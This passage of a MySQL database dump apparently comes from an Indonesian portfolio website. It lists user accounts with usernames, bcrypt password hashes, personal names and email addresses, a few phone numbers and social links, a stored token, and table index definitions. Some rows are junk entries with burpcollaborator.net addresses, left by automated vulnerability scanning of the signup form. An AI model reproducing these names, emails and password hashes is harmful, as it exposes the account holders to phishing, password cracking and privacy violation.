('windayuningsih4973', '$2y$10$DGv01PssfbMHeynnadno4OsoUdZGNqA.ElCW4RcAPd2Dd0LEWMv6m', 'SEMI', 'lu.sm69@hotmail.com', '', '', 'Lain - Lain', '83986', '', '', '', 2, '', 0, ''),
('windayuningsih7666', '$2y$10$YuJ2s5WD8whTvR10hro9w.Z.VDaFPfgDseH2i8BVoYWgXSzfmpmVW', 'ALEA F ATHA HERNOWO', 've.silvalopes@hotmail.com', '', '', 'Lain - Lain', '59904', '', '', '', 2, '', 0, ''),
('windayuningsih7707', '$2y$10$zvct7QolSjVG8E2zZWDULOFaot5hAmoWwFQCJyl7OsUD3d4YfdFl6', 'RUDIYANTO', 'Sandromulinary2@gmail.com', '', '', 'Lain - Lain', '94843', '', '', '', 2, '', 0, ''),
('windayuningsih8336', '$2y$10$sUa3QqG1WMLNll3UHvmZl.4BJ/T1BbG.LMa5YTiv1XkD79/xojDRG', 'ANUM SYIFA AZ ZAHRA', 'telmahenrique2705@gmail.com', '', '', 'Lain - Lain', '45221', '', '', '', 2, '', 0, ''),
('wiranatasya9315', '$2y$10$0DiJQgoSa0NQ3mn3dPx7ledPkW.1x.A9AyHAJ2keC6ew6R2BJAtT6', 'KIJEM', 'stdvivianfortes@hotmail.com', '', '', 'Lain - Lain', '88457', '', '', '', 2, '', 0, ''),
('witarahmawati7275', '$2y$10$mp6L6Sa0RNRr/Z./haV4CeYHyo/Xxq14ivucn6COQLAPWPFKF9AJS', 'NANIK SETIYANI', 'anacarla.l@outlook.com', '', '', 'Lain - Lain', '97448', '', '', '', 2, '', 0, ''),
('witayuliana4078', '$2y$10$iCT37HvX5Lb8eGtyZnRsf.4lCdFraAFUdnd2vA.gsosTjmAgO09Ka', 'TIKEM', 'roselibohnenberger@gmail.com', '', '', 'Lain - Lain', '22661', '', '', '', 2, '', 0, ''),
('witayuliana9766', '$2y$10$Kh21tRdwHinU..PP75fcUe1xr9/THXL/SgNp4vUhYfHP8qqSj4DuO', 'SUYADI SAg', 'rosibarbarasilva@gmail.com', '', '', 'Lain - Lain', '34739', '', '', '', 2, '', 0, ''),
('WqKbnjes', '$2y$10$1aWe99erNKYs3FriLEFGveqYMuqwOYhvonaVoFdHoGobZWsUYF/Rq', 'scJfCAHp', 'cAfmoYgE@burpcollaborator.net', '', '', '', '94110', '', '', '', 2, '', 0, ''),
('wSnwyvqA', '$2y$10$j7Jc1JSogSMkOqBlI6l48uI0vT8syEFGujbCx/Cuggpig5tbttmHi', 'ctNpcdNh', 'qCmnCXOL@burpcollaborator.net', '', '', '', '42501', '', '', '', 2, '', 0, ''),
('xHpRRwTS', '$2y$10$tf1aYEavV634a29f/OoKgOF7bXkuGE9GOp8Tb5RQ9u05Vwyn3.QGm', 'hBBrerVk', 'vxYFhgHb@burpcollaborator.net', '', '', '', '20685', '', '', '', 2, '', 0, ''),
('xNOpRXcq', '$2y$10$Vezm7TnGLpSvrB8HhPTFGOwm2c/005MjLZJOBHJ1wnwMTsgVelCzW', 'uhdyujde3vk6kvxn3haiuzyqgt9z0greiv8k', 'qqb53hmcctt4tt6lcfjg3x7oprix9e0crthi', 'vlg5ymhh7yo9oy1', 'sn1p07j29jquqj3b95g60n4emhfn64x2oje8', '', '60936', 'z4fkhl0gqx787xkpqjxkh1ls3vw1nieg5xvm', 'iz77cdv8lp202pfhlbscctgkynrtia980pqe', '', 2, '', 0, ''),
('xrmqlhGR', '$2y$10$i01hm.bCYwlHSFL8ln7x/.OoPkYXm51sxIyjGH2sQb0FrpApMAsLi', 'CabxYDqb', 'YqLAKGka@burpcollaborator.net', '', '', '', '62083', '', '', '', 2, '', 0, ''),
('XsSlVFkR', '$2y$10$TVtLs8xcNn.a02T3Guf1ZO.hS45Sto770986s3qV79WKAR2Fvt4G2', 'WQIUdduk', 'eXmkkLle@burpcollaborator.net', '', '', '', '83123', '', '', '', 2, '', 0, ''),
('xxcambieber', '$2y$10$KYeYgzATP7h1AwaPsva3audeXLojVzcJjHfSv7q7AyFYXTkeOkFnG', 'athiya', 'athiyamutiara@gmail.com', '', '', '3D', '97508', '', '', '', 2, '', 0, ''),
('xZjIPQgj', '$2y$10$zyZShkrOffvT7JnzsX6d0OMxLRT6N7sm9Yg.0AiSyoPwIB5gJAyqi', 'ciqVNvpd', 'SLZrFPuy@burpcollaborator.net', '', '', 'Fotografi', '41060', '', '', '', 2, '', 0, ''),
('yennyarianti1034', '$2y$10$mMA4jtG4tLP2E.eFpCNzwudpcgiakiR4qGvx7CSKOKxZJXNQeW0Wa', 'AKBAR ZAKY AL LATIEF', 'lucienegalvao91@gmail.com', '', '', 'Lain - Lain', '86065', '', '', '', 2, '', 0, ''),
('yennyarianti2066', '$2y$10$74rlGaV05Ohrz13Y8SEW8eesR/QOM/9HCa6KPaHImCY25Hk8XNNbC', 'AGUS BASUKI', 'santosmarleide497@gmail.com', '', '', 'Lain - Lain', '16988', '', '', '', 2, '', 0, ''),
('YhFIKgbu', '$2y$10$IoR9uFdLZc6QsfyYiEJJvOyIVUxsiLDMgIvDsS2fQw7cKXsCL3QQi', 'vGoZcdoR', 'EOaVpesI@burpcollaborator.net', '', '', '3D', '7424', '', '', '', 2, '', 0, ''),
('Youthcloud', '$2y$10$auSIGnSsNcOZZFZDxYbogeAx/aBZc9bgyI3W7EXYYmohX19A7yGHi', 'Youthcloud', 'youthcloud.id@gmail.com', '(+62) 821591925', 'Yogyakarta', '3D', '22663', 'https://www.instagram.com/youthcloud.id/', 'https://twitter.com/youthcloud1', '', 2, '', 0, ''),
('yulianafitri4965', '$2y$10$6giqO1T5a.MO3cgHqvhijOQGnBfxQKRoPwkcGzVN2.oL5ibA1KF.S', 'KATINO', 'giseledurigon@hotmail.com', '', '', 'Lain - Lain', '35973', '', '', '', 2, '', 0, ''),
('yulianafitri4993', '$2y$10$vPWDR8ZpeSRb8c70nPdQLOjH2PZXl.PPjWgwmEZ.kiKgDR4LR9B/W', 'KARNO', '98242454a@gmail.com', '', '', 'Lain - Lain', '72391', '', '', '', 2, '', 0, ''),
('yulianafitri9887', '$2y$10$2ZA9M2ElcM4I6IgQjA9re.xDEiV3u3zuDzyk1lbHnTGwz.h2QQo9C', 'PARMI', 'Luuzinhasanttana@gmail.com', '', '', 'Lain - Lain', '4329', '', '', '', 2, '', 0, ''),
('yulianalarasati4034', '$2y$10$cABK8.ShNGXphgwdjTWAeO8wwmghYgBTwd18MduIU7G.D9ZaGczKi', 'INA ROHANI', 'Carlosgrego06@gmail.com', '', '', 'Lain - Lain', '70530', '', '', '', 2, '', 0, ''),
('yulianalarasati5113', '$2y$10$RIUeD2L/D22.ZZC7cahHnuamqqM5NORipn89BU/xNFkMBEDbHjq6C', 'SUTARSO', 'mariotayno@gmail.com', '', '', 'Lain - Lain', '96274', '', '', '', 2, '', 0, ''),
('yulianalarasati7740', '$2y$10$pm.CRce7ro0UHYH14x8Px.2xxfoSZyT0aUhkpaFJMGEb1jr344KX2', 'SAKIMIN', 'alexandredavis@hotmail.com', '', '', 'Lain - Lain', '23252', '', '', '', 2, '', 0, ''),
('yulianalarasati8764', '$2y$10$SScEiOofk.AGnt/pjSSH3ew7NhCM/mwd6ar3h.UHPB8McT0GSSd3i', 'ERLANGGA PUTRA APRILIANO', 'lucasferreira8346@gmail.com', '', '', 'Lain - Lain', '58131', '', '', '', 2, '', 0, ''),
('yulianalarasati8787', '$2y$10$qJ95YPg0q05ao8yse5Z6duKJeXn56Ncy99SehmPNx91WqplE.s2iy', 'WIDODO', 'celly_any220@hotmail.com', '', '', 'Lain - Lain', '86808', '', '', '', 2, '', 0, ''),
('yulianiputri4338', '$2y$10$Lk9NbY5JWcESpr5hv4g9FeF48VsVAx9XVtjRpuGoZRXg7.bhb7vIi', 'UNIK SRIPARYATNI', 'Laura.souzasillva@gmail.com', '', '', 'Lain - Lain', '78257', '', '', '', 2, '', 0, ''),
('yulianiputri6194', '$2y$10$rqnyqIpqPOohh1fSKFR/Mefb/0B6PJ5/q9lkSCRSR4LtYZbegZ45G', 'DJOKO POERNOMO', 'leiascopel@hotmail.com', '', '', 'Lain - Lain', '66670', '', '', '', 2, '', 0, ''),
('yulianiputri7424', '$2y$10$wE8i2dIocARtyZdlQtJyH.78f7TKXKhJRRwD/f1pQCt5TRSJnR1BO', 'SUYATMI', 'walkerline_pacheco@hotmail.com', '', '', 'Lain - Lain', '75637', '', '', '', 2, '', 0, ''),
('yulianiwidya1939', '$2y$10$5/3d5rtARPVbUGur4Hqt5.eiw9ANSyv/Kd6vFievMJUCrC5ymvcim', 'PANIYEM', 'rose.reflexus@yahoo.com.br', '', '', 'Lain - Lain', '96681', '', '', '', 2, '', 0, ''),
('yulianiwidya5017', '$2y$10$C22TrPPwze7YN50kvRRYbeUZjCSLmcHgHD2bBsJf3DpTQ4IFpJzz2', 'SARWANTO S.SOS', 'limadarosalilian@gmail.com', '', '', 'Lain - Lain', '32943', '', '', '', 2, '', 0, ''),
('yulianiwidya6211', '$2y$10$s0YvZVmzTgDPfS67Q5JTvurkJo3IBVt4BJbMLEAjzYgQazeDszsCW', 'TARMI', 'camarchiorato@hotmail.com', '', '', 'Lain - Lain', '59434', '', '', '', 2, '', 0, ''),
('yulianiwidya6674', '$2y$10$a6yzoQD4G7z0DrSWVXP33eMHedyDj8u7wWhImIs68uKBglBvnLs52', 'DANISH NUR ADHYASTHA', 'natanyexu@hotmail.com', '', '', 'Lain - Lain', '70887', '', '', '', 2, '', 0, ''),
('yuniamariana1834', '$2y$10$dyKnqwvICo9dkmf4aZKwUeIhYZxz7kORRBVmN8n0J.//In69cVO6e', 'SARIMIN', 'regis_cabeleireira@hotmail.com', '', '', 'Lain - Lain', '33582', '', '', '', 2, '', 0, ''),
('yuniamariana4256', '$2y$10$2K4.X2Rkle9fcoPC3BRehu/md4V33SCgyLInJIYaxvbjpQVjFGuhe', 'SUYATNO', 'rubi_amaral@hotmail.com', '', '', 'Lain - Lain', '29064', '', '', '', 2, '', 0, ''),
('yuniamariana9167', '$2y$10$V69UXzG99hkJqgV9/9CqquT/ROfCtfU5buvW8m/fdyxv5CbcSrbLa', 'ARTASYA PUTRI PRIYANI', 'anabeatriz19878@gmail.com', '', '', 'Lain - Lain', '13588', '', '', '', 2, '', 0, ''),
('yuniamariana9781', '$2y$10$sC6UnX6GAvwi4uZuR39Dre61tnYgbApjGNUIGzt7Hr/lXbP73KwUa', 'SUPRIYANTO', 'kesleytr01@gmail.com', '', '', 'Lain - Lain', '45200', '', '', '', 2, '', 0, ''),
('yunindalarasati2870', '$2y$10$tgzDaY3H4UvOrXjSgObr1OXR0hmD8hS6FIC4sb0zZzeHPKtTiibPK', 'SUKIYONO', 'emer7q@gmail.com', '', '', 'Lain - Lain', '31391', '', '', '', 2, '', 0, ''),
('yunindalarasati8035', '$2y$10$RFrKEVJFl2AlS5QxCokwfe37DrhM4Iz0UMm/FZyBbe0ZDQzzF6pIG', 'MUHAMMAD NAILULMUNA', 'tareco.machado@hotmail.com', '', '', 'Lain - Lain', '14776', '', '', '', 2, '', 0, ''),
('yunindalarasati8602', '$2y$10$Gftdb0Lf1QQVCHrWKRF2lerXUz/FkSmEXmKt9KdLhVlrjIJJDujti', 'KATMI NINGSIH', 'valdilenegermano7@gmail.com', '', '', 'Lain - Lain', '49232', '', '', '', 2, '', 0, ''),
('yunitaanggraini3721', '$2y$10$kHxiCKGpluTFOOpc6RrxieXyz1tsib4VUVlki1tifwRl8KQOqW2g2', 'LIA WIGUNA', 'janaisemedeiros@bol.com.br', '', '', 'Lain - Lain', '41603', '', '', '', 2, '', 0, ''),
('yXgKzAyY', '$2y$10$RqFFyEm.9Jjq3AJSBOJkNOhv7udC3iOwXaQdW.HE3ZBItEOcqGFga', 'nLABgQcc', 'MLqPYGYG@burpcollaborator.net', '', '', '', '17028', '', '', '', 2, '', 0, ''),
('yZwBOMVH', '$2y$10$.hfhXXAUVebaeg1TDRksZuw2guaMhfZZdkOBVVlsAo/kXRpOUEURS', 'InSqpYid', 'fPPOyCKI@burpcollaborator.net', '', '', '', '38375', '', '', '', 2, '', 0, ''),
('ZrSUNwkH', '$2y$10$yGypJW4WocWq9UqfUPG6sOp1R/q308Rx/PQL1yJXmjuMTnM5dhKpO', 'ZkoIPYRk', 'tFYCfhRt@burpcollaborator.net', '', '', '', '1916', '', '', '', 2, '', 0, ''),
('Zwarart', '$2y$10$YZUcsSHJRmeO5j5mkTnzZ.4vBjAnT7l1gEhItgkw1lGiFFds9s.Hu', 'Muhammad Azwar', 'muhammadazwar232@gmail.com', '', '', 'Lain - Lain', '5693', '', '', '', 2, '', 0, '');

-- --------------------------------------------------------

--
-- Table structure for table `user_token`
--

CREATE TABLE `user_token` (
  `id` int(11) NOT NULL,
  `email` varchar(128) NOT NULL,
  `token` varchar(128) NOT NULL,
  `date_created` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `user_token`
--

INSERT INTO `user_token` (`id`, `email`, `token`, `date_created`) VALUES
(1, 'test@gmail.com', 'LuyNb1+bjCTJxWvzMB/R2i08sftplJm1J8DNnypld70=', 1636959294);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`),
  ADD KEY `username_2` (`username`);

--
-- Indexes for table `artikel`
--
ALTER TABLE `artikel`
  ADD PRIMARY KEY (`Id`);

--
-- Indexes for table `contact`
--
ALTER TABLE `contact`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `portfolio`
--
ALTER TABLE `portfolio`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `sosmed`
--
ALTER TABLE `sosmed`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `test_product`
--
ALTER TABLE `test_product`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`username`);

--
-- Indexes for table `user_token`
--
ALTER TABLE `user_token`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `artikel`
--
ALTER TABLE `artikel`
  MODIFY `Id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=57;

--
-- AUTO_INCREMENT for table `contact`
--
ALTER TABLE `contact`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=649;

--
-- AUTO_INCREMENT for table `portfolio`
--
ALTER TABLE `portfolio`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=40;

--
-- AUTO_INCREMENT for table `user_token`
--
ALTER TABLE `user_token`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
